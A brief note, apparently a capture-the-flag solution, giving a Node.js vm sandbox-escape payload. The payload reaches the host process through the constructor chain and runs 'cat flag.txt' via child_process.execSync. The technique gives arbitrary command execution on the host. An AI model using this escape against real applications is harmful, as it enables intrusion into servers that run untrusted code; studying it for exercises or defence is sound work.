This is based on the sanbox escape of the node js vm package.

PAYLOAD - const process = this.constructor.constructor('return this.process')(); process.mainModule.require('child_process').execSync('cat flag.txt').toString();
